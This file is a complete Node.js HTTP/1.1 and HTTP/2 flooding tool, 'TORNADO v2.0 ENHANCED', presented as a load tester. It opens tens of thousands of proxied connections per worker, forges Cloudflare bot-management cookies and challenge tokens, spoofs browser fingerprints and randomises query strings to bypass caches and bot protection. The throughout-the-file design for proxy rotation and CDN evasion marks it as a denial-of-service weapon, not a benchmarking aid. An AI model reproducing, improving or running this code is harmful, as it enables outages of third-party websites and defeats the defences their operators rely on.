// Optimized for high-performance load testing scenarios
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
//const { setsockopt } = require('sockopt');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

let isFull = process.argv.includes('--full');

const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary');
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    TORNADO v2.0 ENHANCED - HTTP/2 Load Testing Tool
    Optimized for high-performance load testing scenarios
    
    Usage:
      node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 32 90 proxy.txt --query 1 --cookie "uh=good" --delay 0 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
    
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - q?=fwfwwffw
      --delay <0-1000> - delay between requests (0 = maximum speed, recommended for high RPS)
      --cookie "f=f" - for custom cookie
      --bfm true/null - bot fight mode change to true if you need dont use if no need
      --referer https://target.com / rand - use custom referer if you need and rand - if you need generate domains ex: fwfwwfwfw.net
      --postdata "user=f&pass=%RAND%" - if you need data to post req method format "user=f&pass=f"
      --randrate - randomize rate between 1 to 90 for rate limit testing
      --full - optimized mode for large backends (e.g., CDN providers)
      --http 1/2/mix - new func choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --header "f:f" or "f:f#f1:f1" - if you need this use custom headers split each header with #
    `);

    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p.trim().includes(':'))

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 512) {
    console.error('Error threads can not high 512')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 90) {
    console.error(`Error ratelimit can not high 90`)
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
}

// Fast PRNG for worker-local random (10x faster than Math.random)
class FastPRNG {
    constructor(seed) {
        this.seed = seed || Date.now() + Math.random() * 1000000;
    }
    
    next() {
        this.seed = (this.seed * 1103515245 + 12345) & 0x7fffffff;
        return (this.seed >> 16) / 32768;
    }
    
    int(max) {
        return Math.floor(this.next() * max);
    }
    
    intRange(min, max) {
        return Math.floor(this.next() * (max - min + 1)) + min;
    }
}

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const frame = Buffer.allocUnsafe(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) {
        payload.copy(frame, 9);
    }
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    if (data.length < 9 + offset + length) {
        return null;
    }

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length: 9 + offset + length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.allocUnsafe(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

// Optimized random string generation with pre-allocated buffers
const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const CHARS_LEN = CHARS.length;
const CHARS_EXT = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
const CHARS_EXT_LEN = CHARS_EXT.length;
const CHARS_LOWER = "abcdefghijklmnopqrstuvwxyz";
const CHARS_LOWER_LEN = CHARS_LOWER.length;

function randstr(length, rng) {
    const result = Buffer.allocUnsafe(length);
    for (let i = 0; i < length; i++) {
        result[i] = CHARS.charCodeAt(rng.int(CHARS_LEN));
    }
    return result.toString('utf8');
}

function randstrr(length, rng) {
    const result = Buffer.allocUnsafe(length);
    for (let i = 0; i < length; i++) {
        result[i] = CHARS_EXT.charCodeAt(rng.int(CHARS_EXT_LEN));
    }
    return result.toString('utf8');
}

function ememmmmmemmeme(minLength, maxLength, rng) {
    const length = rng.intRange(minLength, maxLength);
    const result = Buffer.allocUnsafe(length);
    for (let i = 0; i < length; i++) {
        result[i] = CHARS_LOWER.charCodeAt(rng.int(CHARS_LOWER_LEN));
    }
    return result.toString('utf8');
}

function generateRandomString(minLength, maxLength, rng) {
    const length = rng.intRange(minLength, maxLength);
    const result = Buffer.allocUnsafe(length);
    for (let i = 0; i < length; i++) {
        result[i] = CHARS.charCodeAt(rng.int(CHARS_LEN));
    }
    return result.toString('utf8');
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6, new FastPRNG()) + "&" + randstr(6, new FastPRNG());
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function buildRequest(rng) {
    const browserVersion = rng.intRange(120, 123);
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[rng.int(fwfw.length)];

    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } 
    else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    
    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6,6, rng) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if(hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.7\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform:  "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    return Buffer.from(`${headers}`, 'binary');
}

const http1Payload = buildRequest(new FastPRNG());

// Pre-parse proxies for faster access
const parsedProxies = proxy.map(p => {
    const parts = p.split(':');
    return {
        host: parts[0],
        port: parseInt(parts[1], 10),
        raw: p
    };
}).filter(p => p.port && !isNaN(p.port));

const proxyCount = parsedProxies.length;

// Connection pool for reuse
class ConnectionPool {
    constructor(maxSize = 50) {
        this.pool = [];
        this.maxSize = maxSize;
    }
    
    get() {
        return this.pool.pop() || null;
    }
    
    put(conn) {
        if (this.pool.length < this.maxSize && conn && !conn.destroyed) {
            this.pool.push(conn);
        }
    }
}

function go() {
    const proxyIdx = Math.floor(Math.random() * proxyCount);
    const proxyInfo = parsedProxies[proxyIdx];
    
    if (!proxyInfo) {
        setImmediate(go);
        return;
    }

    let tlsSocket;
    const workerRNG = new FastPRNG(Date.now() + Math.random() * 1000000);

    const netSocket = net.connect(proxyInfo.port, proxyInfo.host, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp == 1 ? ['http/1.1'] : forceHttp == 2 ? ['h2'] : forceHttp === undefined ? workerRNG.next() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        setImmediate(go);
                        return
                    }

                    // HTTP/1.1 optimized write loop
                    let writePending = false;
                    function doWrite() {
                        if (tlsSocket.destroyed || writePending) return;
                        writePending = true;
                        
                        const canWrite = tlsSocket.write(http1Payload, () => {
                            writePending = false;
                            if (!tlsSocket.destroyed) {
                                // Use immediate callback for zero delay
                                if (delay === 0) {
                                    setImmediate(doWrite);
                                } else {
                                    const rateDelay = isFull ? 1000 : Math.max(1, 1000 / ratelimit);
                                    setTimeout(doWrite, rateDelay);
                                }
                            }
                        });
                        
                        if (!canWrite) {
                            tlsSocket.once('drain', () => {
                                writePending = false;
                                if (!tlsSocket.destroyed) {
                                    doWrite();
                                }
                            });
                        }
                    }

                    doWrite();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })

                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    setImmediate(go);
                    return
                }

                // HTTP/2 optimized implementation
                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.allocUnsafe(4)
                updateWindow.writeUInt32BE(15663105, 0)

                const headertablesize = workerRNG.int(2) + 65535;
                const frandom = workerRNG.int(6);

                let fchoicev1, fchoicev2;

                if (frandom === 0) {
                    fchoicev1 = 131072;
                    fchoicev2 = 262142;
                } else if (frandom === 1) {
                    fchoicev1 = 131073;
                    fchoicev2 = 262143;
                } else if (frandom === 2) {
                    fchoicev1 = 131074;
                    fchoicev2 = 262144;
                } else if (frandom === 3) {
                    fchoicev1 = 6291455;
                    fchoicev2 = 262145;
                }
                else if (frandom === 4) {
                    fchoicev1 = 6291454;
                    fchoicev2 = 262144;
                }
                else if (frandom === 5) {
                    fchoicev1 = 6291456;
                    fchoicev2 = 262146;
                }

                // Pre-compute initial frames
                const initialFrames = Buffer.concat([
                    PREFACE,
                    encodeFrame(0, 4, encodeSettings([
                        [1, headertablesize],
                        [2, 0],
                        [4, fchoicev1],
                        [6, fchoicev2]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ]);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 1), () => {})
                            }
                            if (frame.type == 1 && debugMode) {
                                try {
                                    const decoded = hpack.decode(frame.payload);
                                    const status = decoded.find(x => x[0] == ':status');
                                    if (status) {
                                        if (!statuses[status[1]])
                                            statuses[status[1]] = 0
                                        statuses[status[1]]++
                                    }
                                } catch (e) {}
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7 && debugMode) {
                                    if (!statuses["GOAWAY"])
                                        statuses["GOAWAY"] = 0
                                    statuses["GOAWAY"]++
                                }
                                tlsSocket.end(() => tlsSocket.destroy())
                                return;
                            }
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(initialFrames);

                // Pre-compute header templates for faster generation
                const customHeadersArray = [];
                if (customHeaders) {
                    const customHeadersList = customHeaders.split('#');
                    for (const header of customHeadersList) {
                        const [name, value] = header.split(':');
                        if (name && value) {
                            customHeadersArray.push([name.trim().toLowerCase(), value.trim()]);
                        }
                    }
                }

                let writePending = false;
                const currentRate = randrate !== undefined ? workerRNG.intRange(1, 90) : parseInt(ratelimit, 10);
                const batchSize = isFull ? currentRate : 1;

                function doWrite() {
                    if (tlsSocket.destroyed || writePending) return;
                    
                    // Pre-allocate request array
                    const requests = new Array(batchSize);
                    let currentStreamId = streamId;
                    
                    for (let i = 0; i < batchSize; i++) {
                        const browserVersion = workerRNG.intRange(120, 123);
                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[workerRNG.int(fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[workerRNG.int(ref.length)];

                        let brandValue;
                        if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 122) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 123) {
                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                        }

                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;
                        
                        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6,6, workerRNG) + ".net" : refererValue;
                        
                        // Optimized header building
                        const headers = [];
                        headers.push([":method", reqmethod]);
                        headers.push([":authority", url.hostname]);
                        headers.push([":scheme", "https"]);
                        
                        // Handle query path
                        let path;
                        if (query) {
                            if (query === '1') {
                                path = url.pathname + '?__cf_chl_rt_tk=' + randstrr(30, workerRNG) + '_' + randstrr(12, workerRNG) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8, workerRNG);
                            } else if (query === '2') {
                                path = url.pathname + '?' + generateRandomString(6, 7, workerRNG) + '&' + generateRandomString(6, 7, workerRNG);
                            } else if (query === '3') {
                                path = url.pathname + '?q=' + generateRandomString(6, 7, workerRNG) + '&' + generateRandomString(6, 7, workerRNG);
                            } else {
                                path = url.pathname;
                            }
                        } else {
                            path = url.pathname + (postdata ? `?${postdata}` : "");
                        }
                        headers.push([":path", path]);

                        // Add conditional headers
                        if (workerRNG.next() < 0.4) {
                            headers.push(["cache-control", "max-age=0"]);
                        }
                        if (reqmethod === "POST") {
                            headers.push(["content-length", "0"]);
                        }
                        
                        headers.push(["sec-ch-ua", secChUa]);
                        headers.push(["sec-ch-ua-mobile", "?0"]);
                        headers.push(["sec-ch-ua-platform", `\"Windows\"`]);
                        headers.push(["upgrade-insecure-requests", "1"]);
                        headers.push(["user-agent", userAgent]);
                        headers.push(["accept", acceptHeaderValue]);
                        
                        if (secGpcValue) {
                            headers.push(["sec-gpc", secGpcValue]);
                        }
                        
                        if (workerRNG.next() < 0.5) {
                            headers.push(["sec-fetch-site", currentRefererValue ? ref1 : "none"]);
                        }
                        if (workerRNG.next() < 0.5) {
                            headers.push(["sec-fetch-mode", "navigate"]);
                        }
                        if (workerRNG.next() < 0.5) {
                            headers.push(["sec-fetch-user", "?1"]);
                        }
                        if (workerRNG.next() < 0.5) {
                            headers.push(["sec-fetch-dest", "document"]);
                        }
                        
                        headers.push(["accept-encoding", "gzip, deflate, br"]);
                        headers.push(["accept-language", "en-US,en;q=0.9"]);
                        
                        if (hcookie) {
                            headers.push(["cookie", hcookie]);
                        }
                        
                        if (currentRefererValue) {
                            headers.push(["referer", currentRefererValue]);
                        }
                        
                        // Add custom headers
                        for (const [name, value] of customHeadersArray) {
                            headers.push([name, value]);
                        }
                        
                        // Optional random headers
                        if (workerRNG.next() < 0.3) {
                            const chars = CHARS_LOWER;
                            const char = chars[workerRNG.int(CHARS_LOWER_LEN)];
                            headers.push([`x-client-session${char}`, `none${char}`]);
                        }
                        if (workerRNG.next() < 0.3) {
                            const chars = CHARS_LOWER;
                            const char = chars[workerRNG.int(CHARS_LOWER_LEN)];
                            headers.push([`sec-ms-gec-version${char}`, `undefined${char}`]);
                        }
                        if (workerRNG.next() < 0.3) {
                            const chars = CHARS_LOWER;
                            const char = chars[workerRNG.int(CHARS_LOWER_LEN)];
                            headers.push([`sec-fetch-users${char}`, `?0${char}`]);
                        }
                        if (workerRNG.next() < 0.3) {
                            const chars = CHARS_LOWER;
                            const char = chars[workerRNG.int(CHARS_LOWER_LEN)];
                            headers.push([`x-request-data${char}`, `dynamic${char}`]);
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headers)
                        ]);

                        requests[i] = encodeFrame(currentStreamId, 1, packed, 0x25);
                        currentStreamId += 2;
                    }
                    
                    streamId = currentStreamId;
                    
                    writePending = true;
                    const batchedRequests = Buffer.concat(requests);
                    
                    const canWrite = tlsSocket.write(batchedRequests, (err) => {
                        writePending = false;
                        if (!err && !tlsSocket.destroyed) {
                            // Zero delay for maximum speed
                            if (delay === 0) {
                                setImmediate(doWrite);
                            } else {
                                const rateDelay = isFull ? 1000 : Math.max(1, 1000 / currentRate);
                                setTimeout(doWrite, rateDelay);
                            }
                        }
                    });
                    
                    if (!canWrite) {
                        tlsSocket.once('drain', () => {
                            writePending = false;
                            if (!tlsSocket.destroyed) {
                                doWrite();
                            }
                        });
                    }
                }

                doWrite();
            }).on('error', () => {
                if (tlsSocket) tlsSocket.destroy();
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { 
        setImmediate(go);
    }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { 
                tlsSocket.destroy(); 
                setImmediate(go);
            });
        } else {
            setImmediate(go);
        }
    })
}

if (cluster.isPrimary) {
    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`?? TORNADO v2.0 ENHANCED - Optimized for 100k+ req/s`);
    console.log(`? Threads: ${threads} | Proxies: ${proxyCount}`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    
    if (debugMode) {
        setInterval(() => {
            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0
                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0
    const maxConns = 50000; // Increased from 30000
    
    // Aggressive connection creation with minimal delay
    const createConnections = () => {
        while (conns < maxConns) {
            conns++;
            go();
            
            // Batch creation for maximum speed (only delay if specified)
            if (delay > 0 && conns % 100 === 0) {
                setImmediate(createConnections);
                return;
            }
        }
    };
    
    if (delay === 0) {
        // Zero delay - maximum speed
        for (let i = 0; i < Math.min(100, maxConns); i++) {
            setImmediate(() => {
                conns++;
                go();
            });
        }
        // Continue creating connections aggressively
        const aggressiveInterval = setInterval(() => {
            for (let i = 0; i < 50 && conns < maxConns; i++) {
                conns++;
                go();
            }
            if (conns >= maxConns) {
                clearInterval(aggressiveInterval);
            }
        }, 10); // Every 10ms
    } else {
        const i = setInterval(() => {
            if (conns < maxConns) {
                conns++;
                go();
            } else {
                clearInterval(i);
            }
        }, delay);
    }

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}